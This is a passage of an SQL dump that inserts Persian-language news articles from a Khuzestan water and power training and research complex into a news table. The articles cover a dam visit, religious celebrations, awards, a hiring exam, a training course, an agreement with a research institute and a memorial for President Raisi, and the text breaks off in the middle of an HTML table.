INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (59227, 1, 'e7b6bb6e-4088-45d8-9725-d2c15ddd7cbb', 'برگزاری اولین اردوی فناورانه راهیان پیشرفت ویژه دانشجویان فنی مرکز آموزشی و پژوهشی صنعت آب و برق استان خوزستان', '<p dir="RTL" style="text-align: justify;">
	به همت معاونت آموزشی و پژوهشی و همچنین امور فرهنگی دانشجويي مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان نخستین اردوي راهيان پيشرفت (تور علمي و فناوري سد مسجد سلیمان ) به مدت یک روز برگزار گرديد<span dir="LTR">.</span></p>
<p>
	&nbsp;</p>', '<p dir="RTL" style="text-align: justify;">
	دکتر هودگر ریاست مجتمع عالی با بیان اینکه نظر به ضرورت گسترش فعالیت و پویایی هر چه بیشتر دانشجویان، با برنامه ریزی های صورت گرفته گام اول در راستای هویت بخشی به تیم های دانشجویی و ار تباط آن ها با صنعت&nbsp; اردو&zwnj;های راهیان پیشرفت و امید با حضور جمعی از دانشجویان &nbsp;بمدت 1 روز &nbsp;در سد و نیروگاه برق آبی مسجد سلیمان &nbsp;برگزار شد</p>
<p dir="RTL" style="text-align: justify;">
	در این اردو دانشجویان &nbsp;از فعالیت ها و اقدامات مهم این بخش از صنعت و همچنین دستاورد&zwnj;های علمی&nbsp; بازدید داشتند.</p>
<p dir="RTL" style="text-align: justify;">
	&nbsp;هودگر افزود: اجرای منویات رهبر معظم انقلاب مبنی بر جهاد تبیین و اولویت مهم بازگو کردن دستاوردهای نظام اسلامی بهترین راهکار برای مردم به ویژه دانشجویانی است که در معرض &nbsp;تهاجم خبری مسموم قرار دارند که این مهم با عنایت به ارتباط موثر مجتمع با صنایع موجود در استان و بالاخص صنعت آب و برق می تواند فتح بابی برای بازدید هر چه بیشتر دانشجویان باشد و این بعد از نگاه می تواند جلوه&zwnj;ای از پیشرفت، توسعه و خودکفایی در کشور محسوب &zwnj;شود که لازم است نسل جدید و دانش&zwnj;جویان با آن و اهمیتی که برای کشور دارد آشنا شوند.</p>
<p dir="RTL" style="text-align: justify;">
	شایان ذکر است در این بازدید عرب زاده معاونت آموزشی و پژوهشی و حجت الاسلام قدوسی مسئول امور فرهنگی مجتمع بهمراه دانشجویان حضور داشتند که طی بازدید مطالبات و پیشنهادات دانشجویان به مسئولین مطرح گردید و از سوی مسئولین مرکز نیز تاکید بر آن شد که انتظار می رود فعالیت های مشورتی و فعالیت های انجمن های علمی، پزوهشی، فرهنگی و هنری هر چه زودتر تعریف گردد و از ظرفیت های هم افزایی و تعامل با دانشجویان استقبال خواهد شد.</p>
<p dir="RTL" style="text-align: justify;">
	گفتنی است سد مسجد سلیمان یا سد گُدار لَندَ، در شهرستان مسجد سلیمان و استان خوزستان بر روی رودخانه کارون احداث شده&zwnj;است. سد مسجد سلیمان با ۱۷۷ متر ارتفاع از نوع سدهای خاکی می&zwnj;باشد.از ویژگی&zwnj;های بارز این سد دریچه&zwnj;های قطاعی سرریز آن است که بزرگ&zwnj;ترین در جهان محسوب می&zwnj;شود. همچنین نیروگاه این سد بزرگ&zwnj;ترین نیروگاه جریانی کشور به حساب می&zwnj;آید. ظرفیت این نیروگاه ۲۰۰۰ مگاوات است که در دو فاز ۱۰۰۰ مگاواتی اول و ۱۰۰۰ مگاواتی طرح توسعه اجرا شده&zwnj;است. مراحل احداث این سد در تابستان سال ۱۳۷۰ آغاز شده و سال ۱۳۸۰ به پایان رسیده&zwnj;است.</p>
<table align="center" border="0" cellpadding="0" cellspacing="0" dir="rtl" style="width: 805px">
	<tbody>
		<tr>
			<td style="text-align: center;">
				<img alt="" src="wp-content/uploads/news-images/image_162.jpeg" /></td>
			<td style="width: 5px;">
				&nbsp;</td>
			<td style="text-align: center; width: 400px;">
				<img alt="" src="wp-content/uploads/news-images/image_163.jpeg" /></td>
		</tr>
		<tr>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="width: 5px;">
				&nbsp;</td>
			<td style="text-align: center;">
				&nbsp;</td>
		</tr>
		<tr>
			<td style="text-align: center;">
				<img alt="" src="wp-content/uploads/news-images/image_164.jpeg" /></td>
			<td style="width: 5px;">
				&nbsp;</td>
			<td style="text-align: center;">
				<img alt="" src="wp-content/uploads/news-images/image_165.jpeg" /></td>
		</tr>
		<tr>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="width: 5px;">
				&nbsp;</td>
			<td style="text-align: center;">
				&nbsp;</td>
		</tr>
		<tr>
			<td style="text-align: center;">
				<img alt="" src="wp-content/uploads/news-images/image_166.jpeg" /></td>
			<td style="width: 5px;">
				&nbsp;</td>
			<td style="text-align: center;">
				<img alt="" src="wp-content/uploads/news-images/image_167.jpeg" /></td>
		</tr>
	</tbody>
</table>
<p>
	&nbsp;</p>', '59227TsPic.jpg', 329, '1402/12/21', '9:13:34 AM', 1402, 'اسفند', 12, '21');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (59228, 1, 'e7b6bb6e-4088-45d8-9725-d2c15ddd7cbb', 'برگزاری جشن بزرگ‌ نیمه شعبان در مجتمع آموزشی و پژوهشی صنعت آب و برق استان خوزستان', '<p style="text-align: justify;">
	به مناسبت ولادت با سعادت منجی عالم بشریت حضرت مهدی ( عجل الله) جشن خانوادگی با شکوهی در این مرکز برگزار شد.</p>', '<p style="text-align: justify;">
	به مناسبت ولادت با سعادت منجی عالم بشریت حضرت مهدی ( عجل الله) جشن خانوادگی با شکوهی به همت بسیج و امور فرهنگی و دینی مجتمع آموزشی و پژوهشی صنعت آب و برق استان خوزستان در این مرکز برگزار شد.<br />
	<br />
	در این مراسم که با قرائت قرآن و اجرای سرود ملی شروع شد،برنامه های متعددی از جمله&nbsp; خیر مقدم رئیس مجتمع جناب دکتر هودگر، سخنرانی دکتر شریفی درباره مسائل خانواده، استدآپ کمدین ، اجرای مسابقه برای کودکان و اهدای جوایز به آن ها و صحبت درباره انتخابات برگزار گردید.<br />
	<br />
	در انتهای این مراسم همه دعوت سفره بابرکت امام زمان ( عجل الله) بودند و در آخر برنامه نور افشانی در حیاط مجتمع برگزار گردید.</p>
<table align="center" border="0" cellpadding="0" cellspacing="0" dir="rtl" style="width: 805px">
	<tbody>
		<tr>
			<td style="text-align: center; vertical-align: middle; width: 400px;">
				<img alt="" src="wp-content/uploads/news-images/image_168.jpeg" /></td>
			<td style="text-align: center; width: 5px;">
				&nbsp;</td>
			<td style="text-align: center; vertical-align: middle; width: 400px;">
				<img alt="" src="wp-content/uploads/news-images/image_169.jpeg" /></td>
		</tr>
		<tr>
			<td style="text-align: center; vertical-align: middle; width: 400px;">
				&nbsp;</td>
			<td style="text-align: center; width: 5px;">
				&nbsp;</td>
			<td style="text-align: center; vertical-align: middle; width: 400px;">
				&nbsp;</td>
		</tr>
		<tr>
			<td style="text-align: center; vertical-align: middle; width: 400px;">
				<img alt="" src="wp-content/uploads/news-images/image_170.jpeg" /></td>
			<td style="text-align: center; width: 5px;">
				&nbsp;</td>
			<td style="text-align: center; vertical-align: middle; width: 400px;">
				<img alt="" src="wp-content/uploads/news-images/image_171.jpeg" /></td>
		</tr>
		<tr>
			<td style="text-align: center; vertical-align: middle; width: 400px;">
				&nbsp;</td>
			<td style="text-align: center; width: 5px;">
				&nbsp;</td>
			<td style="text-align: center; vertical-align: middle; width: 400px;">
				&nbsp;</td>
		</tr>
		<tr>
			<td style="text-align: center; vertical-align: middle; width: 400px;">
				<img alt="" src="wp-content/uploads/news-images/image_172.jpeg" /></td>
			<td style="text-align: center; width: 5px;">
				&nbsp;</td>
			<td style="text-align: center; vertical-align: middle; width: 400px;">
				<img alt="" src="wp-content/uploads/news-images/image_173.jpeg" /></td>
		</tr>
	</tbody>
</table>
<p>
	&nbsp;</p>', '59228PPic.jpg', 350, '1402/12/21', '9:32:01 AM', 1402, 'اسفند', 12, '21');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (59229, 1, 'e7b6bb6e-4088-45d8-9725-d2c15ddd7cbb', 'مراسم تقدیر از مجتمع در زمینه آموزش و پژوهش', '<p dir="RTL" style="text-align: justify;">
	با توجه به فعالیت های موفق مرکز علمی کاربردی صنعت آب و برق خوزستان در زمینه هی پژوهشی &ndash; نوآوری ، فرهنگی &ndash; دانشجویی و فن آوری در جلسه رؤسای مراکز علمی کاربردی استان خوزستان که در محل دانشگاه جامع علمی کاربردی استان برگزار گردید از تلاش های رئیس و کارکنان این مرکز تقدیر بعمل آمد . لذا لوح تقدیر جداگانه ای در زمینه های فوق الذکر به این مرکز اهدا گردید.</p>
<p>
	&nbsp;</p>
', '<p style="text-align: justify;">
	<span style="font-size:14px;"><strong><span dir="RTL">تقدیراز مرکز آموزش علمی کاربردی صنعت آب و برق خوزستان در خصوص مشارکت فعال در برگزاری همایش جهاد تبیین:</span></strong></span></p>
<p style="text-align: justify;">
	<span dir="RTL">تقدیر از مرکز آموزش علمی کاربردی صنعت آب و برق خوزستان به جهت مشارکت فعال در برگزاری همایش جهاد تبیین با موضوع مهدویت و جشن نیمه شعبان میلاد یگانه منجی عالم بشریت حضرت مهدی موعود (عج)، این مراسم مورخ 2 اسفند 1402 در سالن &nbsp;همایش های واحد استانی دانشگاه جامع علمی و کاربردی خوزستان با دعوت از نماینده محترم ولی فقیه در استان خوزستان حضرت آیت الله موسوی فرد و با حضور اساتید ، دانشجویان و روسای مراکز علمی کاربردی برگزار گردید. </span></p>
<p style="text-align: center;">
	<img alt="" src="wp-content/uploads/news-images/image_174.jpeg" /></p>
<p style="text-align: justify;">
	<span style="font-size:14px;"><strong><span dir="RTL">تقدیر از برگزاری رویداد استارتاپی موفق در سال 1402</span></strong></span></p>
<p style="text-align: justify;">
	<span dir="RTL">جناب آقای دکتر بهرهی سرپرست دانشگاه جامع علمی و کاربردی استان خوزستان به جهت تلاش ها و فعالیت های ارزنده جناب آقای دکتر هودگر ریاست محترم مرکز آموزش علمی کاربردی صنعت آب و برق خوزستان در برگزاری رویدادهای استاتاپی &laquo; مدیریت کیفی منابع آب&raquo; و &laquo; ژنراتورها و موتورها در صنعت برق &raquo; در سال 1402 با تقدیم تقدیر نامه ای تشکر و قدر دانی نمودند. رویدادهای استارتاپی در حوزه آب و برق در دو روز متوالی8 و 9 اسفندماه برگزار گردید. این رویداد با حضور 12 داور برتر در زمینه های تخصصی و حمایت سازمان آب وبرق خوزستان و شرکت هایی چون &quot;شرکت بهره برداری از شبکه های آبیاری کرخه و شاوور، شرکت بهره برداری، تولید و انتقال آب غدیر خوزستان، سازمان علمی پژوهشی سپاه ولی عصر (عج) و نیروگاه رامین&quot; در مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان برگزار گردید. </span></p>
<p style="text-align: center;">
	<img alt="" src="wp-content/uploads/news-images/image_175.jpeg" /></p>
<p style="text-align: justify;">
	<span style="font-size:14px;"><strong><span dir="RTL">مرکز آموزش علمی کاربردی صنعت آب و برق خوزستان در سال 1402 موفق به طراحی و اجرای دوره های کوتاه مدت استاندارد در حوزه های تخصصی گردید.</span></strong></span></p>
<p dir="RTL" style="text-align: justify;">
	مرکز آموزش علمی کاربردی صنعت آب و برق خوزستان در سال 1402 موفق به طراحی و اجرای دوره های کوتاه مدت استاندارد در حوزه های تخصصی گردید در این راستا دکتر کیانوش بهرهی سرپرست دانشگاه جامع علمی و کاربردی استان خوزستان طی تقدیر نامه ای از تلاشها و فعالیت های ارزنده مجموعه پرسنل مرکز آموزش علمی و کاربردی صنعت آب وبرق خوزستان بدلیل طراحی یازده دوره و اجرای یک دوره کوتاه مدت در قالب دانشگاه جامع علمی کاربردی استان خوزستان در سال 1402 قدردانی به عمل آوردند.</p>
<p dir="RTL" style="text-align: center;">
	<img alt="" src="wp-content/uploads/news-images/image_176.jpeg" /></p>
<p style="text-align: justify;">
	&nbsp;</p>
', '59229TaqdirPic.jpg', 424, '1402/12/21', '2:55:03 PM', 1402, 'اسفند', 12, '21');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (59230, 1, 'e7b6bb6e-4088-45d8-9725-d2c15ddd7cbb', 'برگزاری آزمون استخدامی شرکت کشت و صنعت دعبل خزائی', '<p style="text-align: justify;">
	<span dir="RTL">آزمون جذب نیرو در قالب قرارداد تامین نیروی انسانی جهت شرکت کشت و صنعت دعبل خزاعی در تاریخ 26 اسفند ماه 1402 با همت و برنامه ریزی مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان و برگزار گردید.</span></p>', '<p dir="RTL" style="text-align: justify;">
	به گزارش روابط عمومی مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان آزمون جذب نیرو شرکت کشت و صنعت دعبل خزاعی در قالب قرارداد تامین نیروی انسانی از ساعت 9 صبح روز شنبه مورخ <span dir="RTL">26 اسفند ماه 1402</span> در محل مجتمع و دانشگاه پیان نور برای تعدا 2092 شرکت کننده برگزار گردید. در جریان برگزاری آزمون جناب آقای علم الهدی مدیر عامل محترم شرکت کشت و صنعت دعبل خزاعی از حوزه های برگزاری بازدید و از نزدیک بر روند اجرای آزمون را نظارت نمودند. در اثنای این بازدید با جناب آقای دکتر هودگر ریاست مجتمع نیز ملاقاتی داشتند که در این ملاقات بر ادامه همکاری طرفین تاکید گردید.</p>
<table align="center" border="0" cellpadding="0" cellspacing="0" dir="rtl" style="width: 910px">
	<tbody>
		<tr>
			<td style="width: 300px;">
				<img alt="" src="wp-content/uploads/news-images/image_177.jpeg" /></td>
			<td style="width: 5px;">
				&nbsp;</td>
			<td style="width: 300px;">
				<img alt="" src="wp-content/uploads/news-images/image_178.jpeg" /></td>
			<td style="width: 5px;">
				&nbsp;</td>
			<td style="width: 300px;">
				<img alt="" src="wp-content/uploads/news-images/image_179.jpeg" /></td>
		</tr>
		<tr>
			<td style="width: 300px;">
				&nbsp;</td>
			<td style="width: 5px;">
				&nbsp;</td>
			<td style="width: 300px;">
				&nbsp;</td>
			<td style="width: 5px;">
				&nbsp;</td>
			<td style="width: 300px;">
				&nbsp;</td>
		</tr>
		<tr>
			<td style="width: 300px;">
				<img alt="" src="wp-content/uploads/news-images/image_180.jpeg" /></td>
			<td style="width: 5px;">
				&nbsp;</td>
			<td style="width: 300px;">
				<img alt="" src="wp-content/uploads/news-images/image_181.jpeg" /></td>
			<td style="width: 5px;">
				&nbsp;</td>
			<td style="width: 300px;">
				<img alt="" src="wp-content/uploads/news-images/image_182.jpeg" /></td>
		</tr>
	</tbody>
</table>
<p>
	&nbsp;</p>', '59230MainPic.jpg', 1288, '1402/12/26', '3:18:04 PM', 1402, 'اسفند', 12, '26');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (60230, 1, 'e7b6bb6e-4088-45d8-9725-d2c15ddd7cbb', 'نخستین دوره آموزشی تربیت و تعالی راویان پیشرفت در وزارت نیرو یادواره شهید آوینی برگزار شد', '<p dir="RTL" style="text-align: justify;">
	روز پنج شنبه ۱۳ اردیبهشت ۱۴۰۳، آیین اختتامیه اولین دوره آموزشی تربیت و تعالی راویان پیشرفت در وزارت نیرو &quot;یادواره شهید آوینی&quot; در سالن همایش های بین المللی گیت بوستان برگزار شد<span dir="LTR">.</span> برنامه این دوره ملی که اولین دوره آن در خوزستان برگزار شد، به مدت سه ماه در وزارت نیرو در دست بررسی بود و چهار چوب و سر فصل های آن بر اساس استاندارد های روایت گری مشخص شده است<span dir="LTR">.</span></p>
<p style="text-align: justify;">
	&nbsp;</p>', '<p dir="RTL" style="text-align: justify;">
	دکتر هودگر رییس مجتمع عالی آموزشی و پژوهشی سازمان آب و برق خوزستان بیان کردند: حدود ۸۰ نفر از کارکنان شرکت های زیر&nbsp;مجموعه صنعت آب و برق به صورت حضوری و ۱۲۰ نفر نیز به صورت بر خط از اقصا نقاط کشور در این برنامه&nbsp;شرکت کردند و توانستند از آموزش های ارائه شده در این دوره استفاده کنند<span dir="LTR">.</span></p>
<p dir="RTL" style="text-align: justify;">
	وی با اشاره به اینکه همه شرکت های مادر تخصصی ذیل وزارت نیرو از جمله توانیر، آبفا، منابع آب، توزیع برق و نیروگاه های حرارتی همچنین سازمان آب و برق خوزستان و شرکت های زیر مجموعه آن در این دوره سه روزه شرکت کردند، تصریح کرد: به منظور ارزیابی و تعیین سطح شرکت کنندگان، یک آزمون غیر حضوری از امروز به مدت ۳ روز کاری برگزار می شود که شرکت کنندگان با توجه به تکنیک های آموزش داده شده در این دوره یک فیلم کوتاه از روایت گری های خود تهیه کرده و برای دبیرخانه برنامه ارسال می کنند که پس از ارزیابی هیات داوران به ۱۰ نفر اول جوایز ارزنده ای اهدا خواهد شد<span dir="LTR">.</span></p>
<p dir="RTL" style="text-align: justify;">
	ایشان بیان کردند: در این دوره با مفاهیمی از جمله ابعاد بیانیه گام دوم انقلاب اسلامی، سند ملی روایت پیشرفت و تکالیف وزارت نیرو در اجرای این سند و الگوی اسلامی ایرانی پیشرفت و قواعد مربوط به آن آشنا شدیم<span dir="LTR">.</span></p>
<p dir="RTL" style="text-align: justify;">
	وی اضافه کردند: در این دوره روایت هایی از حماسه آفرینی های دفاع مقدس، نقش و سهم نسل جوان و نخبه در ساختن آینده صنعت آب و برق و روایت هایی از دستاوردهای کلان صنعت آب و برق مطرح شد<span dir="LTR">.</span></p>
<p dir="RTL" style="text-align: justify;">
	دکتر هودگر اشاره کردند: آشنایی با اصول روایتگری و سخنوری، زبان و فرازبان ها، زبان بدن، کارکردهای هویتی تاریخ شفاهی، خاطره نویسی و داستان سرایی و آشنایی با تولید محتوا از جمله سر فصل هایی بود که توسط اساتید مربوطه برای علاقه مندان تدریس شد<span dir="LTR">.</span></p>
<p dir="RTL" style="text-align: justify;">
	رئیس مجتمع بیان کردند: در پایان این دوره آموزشی از شرکت کنندگانی که حضور داشتند ارائه روایتگری ۷ نفر انتخاب شد و داوران روایت گری آن ها را طبق استاندارد های تدریس شده بررسی کرده و نقاط قوت و ضعف آنها را مشخص و منتقل کردند تا یک الگوی استاندارد برای ارسال فیلم های روایت گری برای دبیرخانه مشخص شود<span dir="LTR">.</span></p>
<p dir="RTL" style="text-align: justify;">
	وی خاطر نشان کردند: در پایان این مراسم از همه کسانی که برای برگزاری این دوره ملی تلاش کردند با اهدا لوح تقدیر، قدردانی شد<span dir="LTR">.</span></p>
<p>
	&nbsp;</p>', '59231pic.jpg', 254, '1403/2/16', '1:59:41 PM', 1403, 'اردیبهشت', 2, '16');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (60231, 1, 'e7b6bb6e-4088-45d8-9725-d2c15ddd7cbb', 'برگزاری بزرگداشت هفته معلم و استاد در مجتمع آموزشی و پژوهشی آب و برق خوزستان', '<p style="text-align: justify;">
	به مناسبت هفته معلم و گرامیداشت مقام شامخ معلم و استاد، نشست صمیمانه ای با حضور ریاست مجتمع آب و برق خوزستان و مدرسین و اساتید این مجتمع در محل دفتر ریاست برگزار گردید.</p>
', '<p style="text-align: justify;">
	به مناسبت هفته معلم و گرامیداشت مقام شامخ معلم و استاد، نشست صمیمانه ای با حضور ریاست مجتمع آب و برق خوزستان و مدرسین و اساتید این مجتمع در محل دفتر ریاست برگزار گردید. در این مراسم مهدی هودگر ریاست مجتمع ضمن یادآوری فلسفه نام گذاری این روز و تبیین نقش حساس معلم، مراتب تبریک و قدردانی خود و مجموعه آموزشی آب و برق را به حاضرین اعلام نمودند. در ادامه مدرسین به بیان نقطه نظرات و پیشنهادات خود در جهت بهبود کیفیت خدمات آموزشی پرداختند که موارد توسط ریاست و معاونت آموزشی و پژوهشی مجتمع مورد بررسی و پاسخگوئی قرار گرفت. در انتها نیز به رسم ادب لوح تقدیر، هدیه و شاخه گلی به اساتید حاضر در جلسه اهدا گردید. همچنین ریاست مجتمع به همراه معاونت آموزشی و پژوهشی و مسئولین ذی ربط بصورت حضوری در کلاس های درس حاضر و اساتیدی که امکان حضور در جلسه را نداشتند را مورد تقدیر و تجلیل قرار دادند.</p>
<table align="center" border="0" cellpadding="1" cellspacing="1" dir="rtl" style="width: 905px">
	<tbody>
		<tr>
			<td style="width: 450px;">
				<img alt="" src="wp-content/uploads/news-images/image_183.jpeg" /></td>
			<td style="width: 5px;">
				&nbsp;</td>
			<td style="width: 450px;">
				<img alt="" src="wp-content/uploads/news-images/image_184.jpeg" /></td>
		</tr>
		<tr>
			<td style="width: 450px;">
				&nbsp;</td>
			<td style="width: 5px;">
				&nbsp;</td>
			<td style="width: 450px;">
				&nbsp;</td>
		</tr>
		<tr>
			<td style="width: 450px;">
				<img alt="" src="wp-content/uploads/news-images/image_185.jpeg" /></td>
			<td style="width: 5px;">
				&nbsp;</td>
			<td style="width: 450px;">
				<img alt="" src="wp-content/uploads/news-images/image_186.jpeg" /></td>
		</tr>
		<tr>
			<td style="width: 450px;">
				&nbsp;</td>
			<td style="width: 5px;">
				&nbsp;</td>
			<td style="width: 450px;">
				&nbsp;</td>
		</tr>
		<tr>
			<td style="width: 450px;">
				<img alt="" src="wp-content/uploads/news-images/image_187.jpeg" /></td>
			<td style="width: 5px;">
				&nbsp;</td>
			<td style="width: 450px;">
				<img alt="" src="wp-content/uploads/news-images/image_188.jpeg" /></td>
		</tr>
	</tbody>
</table>
<p>
	&nbsp;</p>
', '60231NPic.jpg', 538, '1403/2/19', '12:38:14 PM', 1403, 'اردیبهشت', 2, '19');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (60232, 1, 'e7b6bb6e-4088-45d8-9725-d2c15ddd7cbb', 'تفاهم‌نامه همکاری میان پژوهشگاه نیرو و مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان مبادله شد', '<p style="text-align: justify;">
	روسای پژوهشگاه نیرو و مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان، در راستای توسعه فعالیت&zwnj;های آموزشی و پژوهشی و بهره&zwnj;برداری از ظرفیت&zwnj;های آموزشی و تحقیقاتی طرفین،تفاهم&zwnj;نامه همکاری امضا کردند.</p>
', '<p style="text-align: justify;">
	روسای پژوهشگاه نیرو و مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان، در راستای توسعه فعالیت&zwnj;های آموزشی و پژوهشی و بهره&zwnj;برداری از ظرفیت&zwnj;های آموزشی و تحقیقاتی طرفین،تفاهم&zwnj;نامه همکاری امضا کردند که این تفاهم&zwnj;نامه روز چهارشنبه میان &quot;مجید عمیدپور&quot; رئیس پژوهشگاه نیرو و &quot;مهدی هودگر&quot; رئیس مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان به امضا رسید.</p>
<p style="text-align: justify;">
	همکاری در اجرای پروژه&zwnj;های تحقیقاتی و پژوهشی مورد نیاز صنعت آب و برق، انجام مشاوره یا نظارت بر طرح&zwnj;های تحقیقاتی- پژوهشی در دست اقدام در صنعت آب و برق استان خوزستان و استان&zwnj;های مجاور، برگزاری سمینار، کنگره و نشست&zwnj;های علمی و تخصصی مشترک، طراحی و اجرای طرح&zwnj;های پژوهشی کاربردی مشترک در استان خوزستان و سایر استان&zwnj;های همجوار از جمله محورهای اصلی این تفاهم&zwnj;نامه همکاری است.&zwnj;</p>
<p style="text-align: justify;">
	همچنین گسترش همکاری&zwnj;های آموزشی و صلاحیت حرفه&zwnj;ای طرفین، برگزاری دوره&zwnj;های آموزشی داخلی و بین&zwnj;المللی و ارزیابی&zwnj;های صلاحیت حرفه&zwnj;ای، برگزاری دوره&zwnj;های مدیریت انرژی عمومی و تخصصی در چهارچوب سیلابس مدون مرکز ملی آموزش مدیریت انرژی به نیروهای شرکت&zwnj;های تولید و توزیع برق استان خوزستان و شرکت&zwnj;های توزیع برق جنوب کشور عراق، برگزاری دوره&zwnj;های داخلی و خارجی در محل پارک بین&zwnj;المللی آموزش&zwnj;های تخصصی فوق توزیع و انتقال مستقر در مجتمع خراسان پژوهشگاه نیرو، برگزاری تورهای فناورانه صنعتی و دوره&zwnj;های آموزشی مشترک در استان خوزستان و استان خراسان جهت شرکت&zwnj;های بهره&zwnj;بردار صنعت آب و برق، بخشی از توافقات طرفین در حوزه فعالیت&zwnj;های آموزشی است.</p>
<p style="text-align: justify;">
	&nbsp;تبادل کارشناسان و ایجاد کمیته مشترک به منظور بررسی و ممیزی مسائل و مشکلات مدیریت انرژی، فراهم آوردن بستر همکاری میان نمایندگی&zwnj;های پژوهشگاه نیرو در استان&zwnj;های مختلف نیز از دیگر محورهای قید شده در این تفاهم&zwnj;نامه همکاری است.</p>
<p style="text-align: center;">
	<img alt="" src="wp-content/uploads/news-images/image_189.jpeg" style="height: 466px; width: 700px;" /></p>
<p style="text-align: center;">
	<img alt="" src="wp-content/uploads/news-images/image_190.jpeg" style="height: 466px; width: 700px;" /></p>
<p style="text-align: center;">
	<img alt="" src="wp-content/uploads/news-images/image_191.jpeg" style="height: 466px; width: 700px;" /></p>
<p style="text-align: center;">
	<img alt="" src="wp-content/uploads/news-images/image_192.jpeg" style="height: 466px; width: 700px;" /></p>
', '60232MainP1.jpg', 483, '1403/2/19', '11:53:34 PM', 1403, 'اردیبهشت', 2, '19');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (60233, 1, 'e7b6bb6e-4088-45d8-9725-d2c15ddd7cbb', 'پیام تسلیت رئیس مجتمع در پی شهادت رئیس جمهور محبوب و مردمی و هیئت همراه', '<p style="text-align: justify;">
	رئیس مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان در پیامی شهادت رئیس جمهور جهادی و خستگی&zwnj;ناپذیر و هیئت همراه در سانحه سقوط بالگرد و حین انجام وظیفه برای مردم را تسلیت گفت.</p>', '<p style="text-align: center;">
	بسم الله الرحمن الرحیم<br />
	مِنَ الْمُؤْمِنِینَ رِجَالٌ صَدَقُوا مَا عَاهَدُوا اللَّهَ عَلَیْهِ فَمِنْهُمْ مَنْ قَضَى نَحْبَهُ وَمِنْهُمْ مَنْ یَنْتَظِرُ وَمَا بَدَّلُوا تَبْدِیلًا ﴿احزاب،23﴾</p>
<p style="text-align: justify;">
	روح بلند آیت&zwnj;الله سید ابراهیم رئیسی، خادم الرضا (ع) و رئیس جمهوری محبوب و مردمی و هیئت همراه ایشان حین خدمت به مردم ایران به ملکوت اعلی پیوست.<br />
	با قلبی سرشار از اندوه، شهادت آیت الله سید ابراهیم رئیسی، خادم الرضا (ع) و رئیس جمهور محبوب ایران اسلامی، حسین امیرعبداللهیان، وزیر انقلابی امور خارجه، آیت الله سیدمحمدعلی آل هاشم، امام جمعه بزرگوار تبریز و نماینده ولی فقیه در استان آذربایجان شرقی، مالک رحمتی، استاندار خدوم استان آذربایجان شرقی و دیگر همراهان، حین خدمت و انجام وظیفه برای مردم ایران را به امام زمان ارواحنا له الفداء، رهبر معظم انقلاب اسلامی حضرت آیت&zwnj;الله خامنه&zwnj;ای حفظ الله، خانواده شهدای خدمت و مردم شهید پرور ایران به ویژه خانواده صنعت آب و برق و دانشگاهیان تسلیت عرض می&zwnj;کنم.<br />
	خداوند به همه ما توفیق دهد تا همواره خط سرخ شهادت را پاس بداریم و در مسیر خدمت به مردم، همچون آن شهید بزرگوار خدمت، با اخلاص تمام، انجام وظیفه نمائیم.</p>', '60233Ertehal.jpg', 357, '1403/2/31', '12:58:32 PM', 1403, 'اردیبهشت', 2, '31');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (60234, 1, 'e7b6bb6e-4088-45d8-9725-d2c15ddd7cbb', 'برگزاری مراسم گرامیداشت مقام رئیس جمهورِ شهید آیت الله رئیسی‏ و همراهان ایشان', '<p style="text-align: justify;">
	مراسم گرامیداشت مقام رئیس جمهورِ شهید آیت الله رئیسی&rlm; و همراهان ایشان در مجتمع آموزشی و پژوهشی صنعت آب و برق استان خوزستان برگزار شد.</p>
', '<p style="text-align: justify;">
	به گزارش بسیج و امور فرهنگی و دینی مجتمع آموزشی و پژوهشی صنعت آب و برق استان خوزستان، مراسم گرامیداشت مقام رئیس جمهورِ شهید آیت الله رئیسی&rlm; و همراهان ایشان در مجتمع آموزشی و پژوهشی صنعت آب و برق استان خوزستان برگزار شد.<br />
	این مراسم با قرائت قرآن آغاز گردید و سپس ریاست مجتمع بیاناتی درباره این سانحه غمبار ایراد فرمودند و در ادامه ثواب قرائت زیارت عاشورا و روضه خوانی به ارواح مطهر شهدای این سانحه هدیه شد.</p>
<table align="center" border="0" cellpadding="0" cellspacing="0" style="width: 905px">
	<tbody>
		<tr>
			<td style="width: 450px;">
				<img alt="" src="wp-content/uploads/news-images/image_193.jpeg" /></td>
			<td>
				&nbsp;</td>
			<td style="text-align: center; width: 450px;">
				<img alt="" src="wp-content/uploads/news-images/image_194.jpeg" /></td>
		</tr>
		<tr>
			<td style="width: 450px;">
				&nbsp;</td>
			<td>
				&nbsp;</td>
			<td style="text-align: center; width: 450px;">
				&nbsp;</td>
		</tr>
		<tr>
			<td style="width: 450px;">
				<img alt="" src="wp-content/uploads/news-images/image_195.jpeg" /></td>
			<td>
				&nbsp;</td>
			<td style="text-align: center; width: 450px;">
				<img alt="" src="wp-content/uploads/news-images/image_196.jpeg" /></td>
		</tr>
		<tr>
			<td style="width: 450px;">
				&nbsp;</td>
			<td>
				&nbsp;</td>
			<td style="text-align: center; width: 450px;">
				&nbsp;</td>
		</tr>
		<tr>
			<td colspan="3" style="width: 450px; text-align: center;">
